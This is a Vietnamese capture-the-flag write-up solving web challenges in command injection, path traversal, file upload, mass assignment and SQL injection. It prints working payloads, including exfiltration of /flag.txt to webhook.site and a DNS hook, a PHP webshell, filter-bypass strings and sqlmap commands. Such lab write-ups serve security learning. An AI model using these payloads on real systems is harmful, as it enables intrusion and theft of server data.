# OS COMMAND INJECTION
## NSlookup (Level 1)
- Ở bài này thì sau khi đọc qua source code thì có vẻ không có từ hay kí tự nào bị blacklist nên ta nhập thử
  `google.com; cat /flag.txt` kết quả là ta lấy luôn đc Flag

  ![image](https://github.com/user-attachments/assets/30efeefb-bee0-4e8f-be61-abf194ebd93e)

- Flag `CHH{S1mpl3C0mmandInj3ct1on_49e2bf8031386fe29380e77b41261ebd}`

## NSlookup (Level 2)
- Sau một hồi mình kiểm thử thì thấy hệ thông hầu như đã filter hầu hết các kí tự đặc biệt, giả sử nếu mình nhập `google.com; cat /flag.txt` thì nó sẽ ra như này

![image](https://github.com/user-attachments/assets/49e53cbd-192b-43b1-ac80-a33f420ef74d)

- Giờ mình đọc mã nguồn của nó:

![image](https://github.com/user-attachments/assets/fa684d07-e3bc-4396-82c8-d3119121c77e)
- Có thể thấy server sẽ thực hiện lệnh hệ thống là `nslookup '$domain'` với biến domain lấy từ người dùng nhập vào, giờ ta để ý cách dấu ngoặc đơn, có thể suy luận rành cái filter chỉ hoạt động trong phạm vi cái biến doamain nó thôi.

- Ta thử thêm dấu `'` vào cuối cái domain ta nhập và thêm  `; echo 'Seraph` xem sao:

![image](https://github.com/user-attachments/assets/76250e4d-ba25-4213-a9c5-7ef3447f4d84)

- Có thể thấy sau dấu `'` chí mạng đó thì Filter đã mất tác dụng của mình, giờ thì nhập `google.com'; cat '/flag.txt` để lấy flag thôi;

![image](https://github.com/user-attachments/assets/f5e90777-ab32-4862-84d1-5d61f2bb5bdc)

FLAG: `CHH{C0mmandInj3ct1onWthString_4319d8f6a70fb30372d988e2f5e3e689}`




## NSlookup (Level 3)
- Đến với lv3 thì lần này đã blacklist các từ như cat,ls,... đều không dùng được

- Đầu tiên ta kiểm tra xem bài có bị lỗi ko (chắc chắn là có rồi) , payload: `google.com'; whoami; echo'1`
![image](https://github.com/user-attachments/assets/7c565ac5-d2eb-4da3-9a1b-df45c0b3e330)

- Có vẻ như ta cần phải nhập đúng theo form của nó, đọc source thì ta thấy phía fontend đã filter bớt đi một vài ký tự
![image](https://github.com/user-attachments/assets/66b21658-e8f0-478a-bdaf-b0884c03c746)

- Nhưng vì nó chỉ filter ở phía fontend nên ta có thể sử dụng BurpSuite để chỉnh sửa lại Request của mình bằng công cụ Repeater;
![image](https://github.com/user-attachments/assets/bc6c8e24-1747-4e46-bf4a-a8499f3fffbe)

- Từ hình ta thấy cả 2 câu lệnh `whoami` và `echo 1` đều được thực hiện --> Xác nhận web bị lỗi OCI

- Giờ thì đến phần blacklist, vì flag có format là `/flagXXXXX.txt` nên muốn đọc flag thì ta cần dùng lệnh `cat /flag*.txt` nhưng theo như ta đã biết thì các từ như `cat`,`head`, `tail` và `*` đều đã bị filter

- Đối với `*` thì ta có thể dùng dấu `?` để thay thế được, nhưng còn từ `cat` thì sao, đến lúc hỏi anh GPT rồi

![image](https://github.com/user-attachments/assets/d8ac5d4c-63e3-4704-80d1-4a301fadbb35)

- Vậy từ những thông tin ta thu thập được thì ta đã rút ra một payload `google.com'; tac /flag?????.txt; echo '1`

![image](https://github.com/user-attachments/assets/1ca035de-6cae-4313-a12b-d8d10c4c6332)

- FLAG: `CHH{N5l00kupM00r3_7bce17a40c66148871010cfb854478a6}`

## Ping 0x01
-Source code:
![image](https://github.com/user-attachments/assets/cb4acddf-c25c-4307-8695-c01030a498da)

- Đọc source code của bài thì ta thấy bài đã tự động thay thế các ký tự như `||`, `;`,... thành dấu cách, vậy nên khi ta nhập như payload `8.8.8.8; cat /flag.txt` thì nó sẽ tự động filter đi dấu `;` khiến câu lệnh không chạy được

![image](https://github.com/user-attachments/assets/c614710a-7409-4164-a222-7cda3efcddc7)

- Sau một hồi tìm hiểu thì ta nhận ra code đã quên filter dấu xuống dòng nên ta sẽ thử Payload `8.8.8.8 /n cat /flag.txt` và nhân được flag

![image](https://github.com/user-attachments/assets/46d0fd17-4919-42f2-ada9-caf6542a2aaa)

-FLAG: `CHH{EASY_f11tEr_coMM4ND_INJ3c71oN_95b37fb1e23fe27131f4e98d5542a51f}`

## Ping 0x02

![image](https://github.com/user-attachments/assets/8f106470-5524-4bde-869b-e1759acff85a)

- Về cơ bản thì bài này là dạng khó hơn một chút của bài phía trên, phần filter cũng đã update thêm các từ như `flag`, dấu cách nhưng mấu chốt là nó vẫn chưa filter dấu xuống dòng

- Giờ ta sẽ xử lý phần filter:
  - Đối với chữ `flag` thì ta có thể dùng `flflagag` để khi filter đi nó sẽ còn lại từ flag
  - Còn đối với dấu cách, sau khi tham khảo qua PayloadAllTheThings thì ta sẽ biết được việc có thể dùng dấu `<` thay cho phím cách
 
- Từ đó ta rút ra Payload `cat</flaflagg.txt`

  ![image](https://github.com/user-attachments/assets/64d57cc9-4384-4275-b55b-5fcaad50ec97)

-FLAG: `CHH{Med1Um_F11TEr_coMm4ND_InJ3C71On_019e15d5beae757f0b30449d2812fd86}`

## Ethical Ping Pong Club

![image](https://github.com/user-attachments/assets/9c644c6b-6811-49b8-b2a6-374f4f6efad5)

- Lại là một bài liên quan đến câu lệnh ping

- Vì quá lười nên mình copy luôn payload của bài trên vào chạy thử, ai ngờ ra luôn Flag
![image](https://github.com/user-attachments/assets/7cdbb8c4-c5d1-424b-b80d-1937dd3a9c3b)

- FLAG:`EHC{C0mm4nd_1nj3ct10n_be635c1c11725b9399cee25022613e02}`

## Youtube Downloader
- Đầu tiên mình sẽ nhập một url của video bất kỳ trên youtobe thì nó se tải về thumb của vid đó --> khá tương tự như câu lệnh wget

- Sau đó mình thử nhập URL webhook của mình
  
 ![image](https://github.com/user-attachments/assets/9c4d8f74-695f-4288-8380-cfd998fd0e98)
 
- Kiểm tra các request đến nó thì nhận được flag
![image](https://github.com/user-attachments/assets/3dfec811-6384-41dc-924f-976131b40d3c)
- FLAG: `CHH{Ea5y_cOmmaND_inj3c7Ion_001eec098bbb94d1b9f18550823f9eaf}`

## Blind Command Injection

 ![image](https://github.com/user-attachments/assets/a02a9fb2-cc4d-4d70-9577-0086735bb029)

- Truy cập bài, và đổi phương thức thành OPTIONS theo như hint của bài:

 ![image](https://github.com/user-attachments/assets/793a89c4-7b1a-487d-9ba3-fba971225c05)

- Tìm đc web chỉ allow: GET và HEAD
- Thử đổi lại phương thức bằng HEAD, và sau khi mình tìm hiểu tên mạnh về Blind OS command injection OOB thì mình rút ra đc 1 payload là `nslookup+$(cat+/flag.txt).d53ada46-f264-41c4-81f7-77285218ae67.dnshook.site`

- Nhập và và kiểm tra webhook:
![image](https://github.com/user-attachments/assets/4d4b0b6d-0c01-40d7-96ea-ea6c224017f9)
- FLAG: `CHH{bl1Nd_c0MMaNd_InJec7iON_f77f8d71ff6846ba8923ee0af2fabb53}`

## Baby Crawler

- Đọc source code thì biết web sẽ dùng câu lệnh curl để lấy thông tin từ các web, đồng thời nó cũng dùng hàm để ngăng chặn OS Command Injection, vậy nên ta chỉ còn cách tận dụng câu lệnh curl thôi
![image](https://github.com/user-attachments/assets/22771e10-d5c6-4bce-bd84-bb52ac3fa3da)

- giờ ta chỉ cần thêm payload `-d @/flag.txt https://webhook.site/ce0a9f56-527e-4213-ab41-4bf7e2418144` vào sau cái link có sẵn.

- Truy cập webhook của ta và sẽ nhận được flag:

![image](https://github.com/user-attachments/assets/c6743b3a-eb93-4312-a4d2-538d7692bf4a)

- FLAG: `CHH{b48Y_CUrl_CrAwl3r_726a0edb7d4e86c0d1d71e6801518f01}`



# Path Traversal

## eViewer

![image](https://github.com/user-attachments/assets/aab99be9-0d69-4dc4-b6d2-489435252aaf)

- Vào bài mình thấy một giao diện đọc môt file trong thư mục /var/www/html, nên mình nghi nó bị lỗi Path Traversal
- Thử nhập Payload `../../../etc/passwd` thì thấy nó đọc đc -->  Confirm lỗi
![image](https://github.com/user-attachments/assets/f35a1dec-7b92-48c0-bf11-d1bad77b31bf)

- Lúc này chỉ cần đổi Payload thành `../../../flag.txt` là sẽ lấy đc Flag
![image](https://github.com/user-attachments/assets/8f76c26b-e83c-4cb5-be67-4babda7133c9)


- FLAG: `CHH{P4thf1nd3r_7e235142b641560f4baefe0ce5c6efd0}`

## File Download
- Ban đầu tưởng web bị lỗi File Upload nên cũng tốn kha nhiều thời gian có việc đó :v
  
![image](https://github.com/user-attachments/assets/03107fdb-ab02-484c-b8c2-40629fb824e3)

- Sau một hồi bế tắc thì mình ấn sáng nút home (đến h mới thấy đc nó), thì thấy web báo lỗi, nhưng nhìn vào thanh url thì ta tìm đc khá nhiều thông tin hữu ích

![image](https://github.com/user-attachments/assets/62185801-40e0-4698-b9f4-75bf7ac0badc)

- Ta biết thư mục hiện tại ta đáng đứng cách thư mục root tận 6 bậc và từ trang đó ta cũng biết đc web bị lỗi Path Trversal, ấn vào chỗ để đọc file để ta đọc file flag:

![image](https://github.com/user-attachments/assets/b1706b6c-597b-442b-80a9-02cda8c2d693)

- Lúc này ta đổi Payload thành ?name=../../../../../../flag.txt để đọc file flag xong thư mục root

![image](https://github.com/user-attachments/assets/03ebe7e2-9c7c-4222-b20a-dd1e9189cd50)

-FLAG: `CHH{eASy_DoWN104d_F1L3_763706b25a54ac0db627980f3c8a04ff}`

## Cookie Comic

- Đọc source cod thì có vẻ thì các ảnh được lấy từ một file nào đó trên hệ thống
  
![image](https://github.com/user-attachments/assets/3b483a35-1acc-4339-8fc1-6785338b8e0d)

- Dùng Burpsuite để chặn request của cái image đó:

![image](https://github.com/user-attachments/assets/c3b1eb81-9606-42a8-a25e-cbb555447188)

- Đưa vào repeater để thử các Payload, sau một hồi thử thì mình phát hiện ra nó bị lỗi Path Trarversal thông qua payload `../../etc/passwd`

![image](https://github.com/user-attachments/assets/ef438855-f41e-4924-9362-52ef91828b47)

- Vì đã biết thư mục flag tên gì nên chỉ cần đổi Payload lại thành `../../flag.txt` là lấy được FLAG

![image](https://github.com/user-attachments/assets/0350301e-4bb8-44ec-9bc7-4731db6ad278)

- FLAG: CHH{C00k13C0m1c_089f136ea3fb269d1e9768e68024dd5c}




# Mass Assignment

## Mass Assignment Profile

![image](https://github.com/user-attachments/assets/f0c71b18-08d9-46da-b47b-6a0b2d8ca823)

- Theo như đề bài thì để lấy được Flag thì ta phải có được role là admin

- Truy cập web và đăng nhập:
  
![image](https://github.com/user-attachments/assets/a1ede24c-90fe-4220-a9a7-7ca9970e285b)

-  Có thể thấy chức năng update info, và role hiện tại ủa mình là guest --> thử truyền thêm tham số role=admin vào request POST:

![image](https://github.com/user-attachments/assets/6bce4ada-7762-42e3-b15f-0adc57d9e185)

-  FLAG:`M4ss_4ss1gnm3nt_D4ng3r_f00b7bd6680c082c2d7852cd9b586000`

## Modify user role

![image](https://github.com/user-attachments/assets/76c377f3-30bf-4d49-9066-fd6a211ecaa9)

- Sau khi đăng nhập, ta có được thông tin là để xem được flag thì ta cần phải có id là 2

![image](https://github.com/user-attachments/assets/0f4377c1-c9bc-4a0c-a2b2-547e4188d70e)


- Giống như bài trên ta, nó cũng có chức năng update mail --> ta tiếp tục truyền thêm tham số `role=2` vào, và nhận được flag

![image](https://github.com/user-attachments/assets/b467702c-ae29-4a1f-ac8b-4be8b47fe2dd)

-FLAG:`CHH{U5er_RolE_Can_BE_mod1F1ED_dca3762d6d64af316fa6ff79c5498416}`

# Upload File

## The Evil Assignment on Canvas
- Truy cập web thì thấy web chỉ cho phép upload jpg/jpeg
![image](https://github.com/user-attachments/assets/4e9142c0-4689-4e19-98c4-9d5a7222a595)

- Thử upload một file đuối .jpg.php xem có được ko:
  
![image](https://github.com/user-attachments/assets/d3eeb52e-d7fd-4656-8c13-97909ae50d45)

- Vậy là ta đã thành công upload đc, lúc này chỉ cần thêm webshell vào giữa file thôi

![image](https://github.com/user-attachments/assets/31eb2c9c-abb0-4f23-83d5-99ca4a89bd7f)

- Truy cập file vừa up và đọc flag:
  
![image](https://github.com/user-attachments/assets/500a87c8-c4d9-4ec9-893c-2b5ab8564431)

- FLAG: `CHH{l3v3L_4_c0d3_0f_c0ndUcT_a928ab2a76bd3338eaa3dd3866154a80}`

## Obfuscating file extensions

![image](https://github.com/user-attachments/assets/aebab026-e611-4005-b246-a1a5de9d3240)

- Theo như thông tin đề bài cung cấp thì nó sẽ thay cách từ như `.php`,`.php1`,... thành các `''` khi phát hiện nó ytong file name

- Để bypass nó ta chỉ cần đổi đuôi file thành `..phpphp` để khi filter `.php` đi nó sẽ chỉ còn `.php` (đổi câu lệnh thành cat /flag*.txt nha)

![image](https://github.com/user-attachments/assets/f7d7d544-99d6-428d-a466-ed27ca2c104e)

- Sau khi upload thành công, truy cấp file và bú FLAG

![image](https://github.com/user-attachments/assets/13e184d8-2556-414a-a506-8938e6021740)

-FLAG: `CHH{obFusc@7IN6_Fi13_eXtEns10ns_99f23c7ad51135443441d466b46bf21c}`

## Flawed file type validation
![image](https://github.com/user-attachments/assets/bb447284-12f9-4001-b1a6-d407208a89fa)

- Có vẻ bài này liên quan đến MIME attack

- Vì server filter file theo dạng content type nên ta chỉ cần upload một file png nên xong dùng burpsuite để đổi tên file thành php là đc

- webshell: `<?php system('cat /flag*.txt'); ?>`

- Lúc này file đã được upload thành công, truy cập file và lấy flag thôi

![image](https://github.com/user-attachments/assets/ebdf82e9-b132-44b9-b7c6-ad638a6a0ff1)

![image](https://github.com/user-attachments/assets/ad4126a3-bb4d-4a93-b9ff-a5ab890dd62e)

- FLAG: `CHH{f4K3_CONtEnt-TyPE_3ef631218950f3a6be54e2712601b160}`

## Insufficient blacklisting file types

![image](https://github.com/user-attachments/assets/ff06036e-4c31-45cf-bc64-0af0b75633f4)

- Có thể thấy bài này đã đưa các tên file có đuôi .php,... vào black list nên không thể up các file đuôi đó lên được

- Trong khi mình đang dùng công cụ Repaeter của Burpsuite để test thì mình nhận ra là web đang sài Apache --> Mình sẽ upload file `.htaccess` để chỉnh sửa sao cho server sẽ xử lý file png như một file php từ đó có thể chạy code php trong file đó

![image](https://github.com/user-attachments/assets/f401955f-b808-4039-9b3f-6cf33eef3a8b)

- Từ đó sau khi up xong thì ta sẽ up một file .png chứa webshell bên trong:

  ![image](https://github.com/user-attachments/assets/e82fe115-168c-443d-8604-102c814d0828)

- truy cập file đó và nhận flag:

![image](https://github.com/user-attachments/assets/4a85ccd8-290f-4602-b492-9dc2f2d26bdc)

-FLAG: `CHH{IN$UFFicieNT_81Ackl1st1NG_f1LE_7YP35_1efadb9514cb1369e1b05bd0b27fa1d4}`

## Upload File Path Traversal (Không biết nên thêm nó vào mục nào nữa :v)
![image](https://github.com/user-attachments/assets/48b6a15a-7fb1-454d-bb85-b4e8733ef7b9)
-Theo như đề bài ta biết thì ta không thể upload web shell vào thư mục upload + thêm tag Path Traversal nữa --> chúng ta sẽ tìm cách upload vào thư mục khác thử

- Bài này khá dễ, ta chỉ cần đổi tên file thành `../test.php` là có thể có flag r
  
![image](https://github.com/user-attachments/assets/734e42b7-262d-403e-b998-1ad406d2d52b)

- Đời không như mơ, có vẻ như web đã filter đi cách ký tự `.` và `/` rồi

- Ta thử URL encode dấu `.` thành `%2e` và `/` thành `%2f` xem sao, payload `%2e%2e%2fkhoi.php`

![image](https://github.com/user-attachments/assets/b2ffcbf6-303a-463d-8b8f-d85ef2366285)

- File đã upload thành công ở thư mục tra của upload --> Tiến hành truy cập nó và nhận flag

![image](https://github.com/user-attachments/assets/d5c75142-1a9b-44c9-85e7-5d2ea92007da)

- FLAG: `CHH{uPl04d_vIA_P4tH_Trav3r54L_bc28bb8d0546e3a1b20d419f9ab1bd62}`




# Else

## COMB

![image](https://github.com/user-attachments/assets/dfdefffa-51c0-42b2-b152-1e254554f2c2)

- Nhìn chức năng đăng nhập nên mình tưởng nó bị lỗi SQLi nhưng sau một hồi thử các payload trong vô vọng không được nên mình thử tìm một hướng đi khác
  
- Check xem có tồn tại đường dẫn robots.txt không, thì thấy web còn có một đường dẫn khác:
 ![image](https://github.com/user-attachments/assets/0a68e644-cf3c-4ce6-a873-be90682efbaa)

- Truy cập đường dẫn đó thì nó dẫn đến một chỗ để tra mk của các video mà mình nhập vào, nên mình nhập thử mail của cha john:

![image](https://github.com/user-attachments/assets/13133108-b95e-4bb9-b9a8-cf02b1c1ffbe)

- Lấy được mật khẩu của mail ổng `football24`, sau đó đăng nhập và lấy flag

![image](https://github.com/user-attachments/assets/dfc527b5-d34f-41b6-9560-ffef819e3f95)

- FLAG: `CHH{C0MBL34kD47a_6a9a1f9bf022b1cd4f734e2fbc816213}`

## Be Positive

![image](https://github.com/user-attachments/assets/596b1653-3bf2-4477-ad1c-60883dbf5833)

- Truy cập web, sau một hồi tìm hiểu thì mình thấy mỗi tài khoản đều có sẵn trong mình 1500 đô, nếu chuyển qua chuyển lại thì một người thì chỉ có thể có nhiều nhất 300$, mà Flag lại có giá 3001$, nên ta phải tìm cách để chuyển được số tiền nhiều hơn 1500$ cho người còn lại
-  ![image](https://github.com/user-attachments/assets/d64ddb72-b4a4-4ec4-9740-b2ab0172f65a)

- Bình thường theo như thuật toàn cơ bản thì khi ta chuyển tiền, hệ thông sẽ lấy số tiền ta đang có trừ đi số tiền mình chuyển đi, vậy nếu ta chuyển đi `số âm` thì sao, trừ với trừ sẽ thành cộng, thay vì ta mất tiền thì ta sẽ nhận thêm tiền, vậy là ta đã có được bug vô hạn tiền

![image](https://github.com/user-attachments/assets/a4b07ca2-92dd-4734-9912-ba8d6606c8df)

- Sau khi chuyển tiền thì có thể thấy số dư của ta thay vì giảm thì nó lại tăng lên, vậy là ta đã trở thành triệu phú chỉ bằng một dấu trừ

![image](https://github.com/user-attachments/assets/c0f560a0-2e7e-4244-9aeb-216807d6e36b)

- Lúc này ta dùng số tiền đó để mua flag và lấy flag

![image](https://github.com/user-attachments/assets/a1c0c46f-14f3-4de0-a7af-679bac939f5a)

- FLAG: `CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_8c62d12829767bc723909857612cab3d}`

- ở bài này nếu ta mua flag ở acc alice thì nó sẽ hiện fake flag nha

## Slow Down

![image](https://github.com/user-attachments/assets/5dfb803b-00e8-4a45-95d2-3c59a72794d2)

- Đây là bản nâng cấp của bài trên, có lẽ nó đã filter lỗi bug vô hạn tiền ở trên rồi nên ở bài này ta sẽ thử tìm xem còn cách nào không

![image](https://github.com/user-attachments/assets/b979e68b-a2c9-48df-b715-821547c0d7e8)

-  Đúng như dự đoạn, lỗi bug vô hạn tiền đã được fix, bài này mình phải đọc writeup trên mạng mới làm đc

- Ta thử nhập số tiền `1000000000000000+1` xem có gì xảy ra không

![image](https://github.com/user-attachments/assets/75b09bae-e109-4c35-8866-3d4fb90c5aa4)


- Vậy là đã chuyển thành công, lúc này ta đăng nhập acc alice để mua flag

![image](https://github.com/user-attachments/assets/5e418215-14be-4107-9e2d-94ddc0a58dd0)

- Acc alice lúc này đã được cộng tiền, mua flag thôi

![image](https://github.com/user-attachments/assets/c77a8dd6-77fd-41b5-ae7e-a3652cd20491)

-FLAG: `CHH{ea5y_RaCe_CONd17iOn_2e7cfece1d547584c2065a0b76bf567e}

# SQLi

## Baby Address Note

### Thủ công

- Đọc đề bài thì có suy ra được trang web bị lỗi SQLi, thử nhập 3' xem sao:

![image](https://github.com/user-attachments/assets/b63f3a24-d8e0-4662-9daf-f24c9a9dc189)

- Nhập `3'` không được, giờ thử nhập `3'-- -` xem:

![image](https://github.com/user-attachments/assets/5fb723d1-6db8-42d4-97e1-d28a96e3c184)

- Từ đó có thể biết đc tỉ lệ nó bị lỗi sqli rất cao, và do nó hiện thị nhiều cột thông tin nên mình sẽ thử khai thách nó theo hướng `UNION`

- Payload: `3' UNION SELECT 1,2,3-- -`:

![image](https://github.com/user-attachments/assets/c69c7ddc-2659-49c7-a461-0d5143b55ccc)

- Vậy có thể tận dụng lỗ hổng này:

- Tiếp tục check xem loại CSDL của nó, bằng cách đọc file /debug --> sqlite

![image](https://github.com/user-attachments/assets/2715a561-5e18-4ce9-ba8d-77ca22eedd17)

- Nhập thử payload `0' UNION SELECT name,sql,3 FROM SQLite_master-- -` --> rút ra được tên bảng là `flag_TCupV`

![image](https://github.com/user-attachments/assets/22c80914-7fb4-4c50-ba08-7b0a3063f9d1)

- Tiếp tục khai thác tên các cột `0' UNION SELECT 1,flag,3 FROM flag_TCupV-- -` --> Lấy được flag:

![image](https://github.com/user-attachments/assets/ad76ffa4-e9d5-4293-a0cb-7aaeaa0b948c)

- FLAG: `CHH{5QL_INJ3cTiON_SQL1T33_a7e994e249dea03c040091a30ac5c696}`

### sqlmap

- Đầu tiên mở Linux lên và vào terminal gõ `sqlmap -u http://103.97.125.56:32338/?uid=1 --dbms=sqlite --tables ` (vì đã biết trước csdl là SQLite nên ta sẽ chỉ cần kiếm các bảng thôi)

- Tìm được ba bảng, trong đó có 1 bảng tên `flag_7PwJT` nên ta target vào bảng đó
  
![image](https://github.com/user-attachments/assets/c36b732c-eb14-454e-b63f-0af1c0f7f30f)

- Lúc này tiếp tục gõ `sqlmap -u http://103.97.125.56:32338/?uid=1 --dbms=sqlite -T flag_7PwJT --columns  ` để tìm các cột của bảng
- Thì thấy một cột FLAG

![image](https://github.com/user-attachments/assets/7600fdc0-ee60-45cd-8a07-30e31e8590ff)

- Tìm thấy một cột Flag, giờ thì chốt lại bằng  `qlmap -u http://103.97.125.56:32338/?uid=1 --dbms=sqlite -T flag_7PwJT -C flag --dump
 ` để lấy flag

![image](https://github.com/user-attachments/assets/3d235025-0c47-4b2a-b614-284413b2cb49)

-FLAG: `CHH{5QL_INJ3cTiON_SQL1T33_7a4050559c8c2100591e6dafd5f4ed0f}`

## SQL injection vulnerability in WHERE clause 

- Vào web, có thể thấy web nhận dữ liệu thông qua tham số Category:

![image](https://github.com/user-attachments/assets/634444a2-3872-4627-bc72-07b3c85d2bf2)

- Test thử các Payload xem nó có bị lỗi SQL ở đó không:
  -`pet'`
  ![image](https://github.com/user-attachments/assets/ec2e594b-592c-471b-a114-9d420d201e99)
  -`pet'-- -`
  ![image](https://github.com/user-attachments/assets/b3878060-e91b-46fd-886f-1e978c9353d0)
- Vậy xác nhận chỗ đó bị lỗi SQLi
- Thử nhập `flag' or 1=1-- -`

![image](https://github.com/user-attachments/assets/bc47561f-e11a-4f3b-8a74-08bd2152b717)

FLAG: `CHH{51mpL3_Sqli_IN_WhER3_d08f499ecc67f741d27b0ad3e313801f}`

## SQL Truncation Attack

- Ấn vào bài và vào mục đăng ký, có thể thấy mã nguồn của bảng dữ iệu

![image](https://github.com/user-attachments/assets/07736da3-591b-4c69-8cca-ea36e50bb0c9)

- Có thể thấy bảng chỉ cho phép mục `username` chỉ được chứ tốTHi đa 20 ký tự, và theo như hint của bài thì CSDL sẽ tự động xóa đi những ký hiệu dư thừa nếu đã vượt mức 20 ký tự

- Vậy nếu giờ đã có một username tên `admin` thì ta nếu ta tạo một acc với có username là `admin_______________123` (thay ký tự _ bằng dấu cách) thì CSDL sẽ lưu lại username đó với tên là `admin`, vậy ta sẽ co thể tạo một acc với username trùng với username của tài khoản admin, với mật khẩu của thì mình sẽ có thể truy cập vào tài khoản của admin và lấy flag

- Thực chiến
-  Tạo một tài khoản với username `admin               123` với pass là `123`
  
![image](https://github.com/user-attachments/assets/99674e1d-bf3c-4846-808d-8d091b253d31)

- Vậy mình đã tạo tài khoản thành công, quay trở lại trang đăng nhập và đăng nhập với username `admin` và pass `123`

![image](https://github.com/user-attachments/assets/03287cec-39c9-477a-8ad3-8518970999f6)

- Nhận được flag:

![image](https://github.com/user-attachments/assets/f7d07810-efc8-4d4f-828d-978c8c72749d)


- FLAG: `CHH{MySQL_M1sc0nf1gur4t1on_SQL_Trunc4t4ion_c2cc42e0937c3f35abe98e3b366fdcbb}`

## Simple SQLi

![image](https://github.com/user-attachments/assets/814509bf-deb8-43bb-86b6-0ba6c83ba633)

- Tải file mà bài cung cấp về, có thể thấy các bảng được tạo sẵn

![image](https://github.com/user-attachments/assets/5289ea7f-f27b-4323-9acb-2c2462fd6eba)

- Trong đó có câu lệnh truy vấn sql

![image](https://github.com/user-attachments/assets/645fd340-0a31-435e-a145-37dbc1ed8f2a)

- Và từ đó ta rút ra payload là `0' and userid ='admin'-- -`, nó sẽ hợp với điêu kiển của source code, nhập vào và lấy flag

![image](https://github.com/user-attachments/assets/22a61825-d707-4aaa-a73d-e5420b072415)

- FLAG: `CHH{5IMpL3_5ql_1njEC710N_e73e49f1a370de611a66b04f66bb4eec}`

Và nếu dùng sqlmap ta có thể tìm đc tk mk của admin

![image](https://github.com/user-attachments/assets/a1e3ace6-25f8-459d-b705-525ef86a4a17)






 












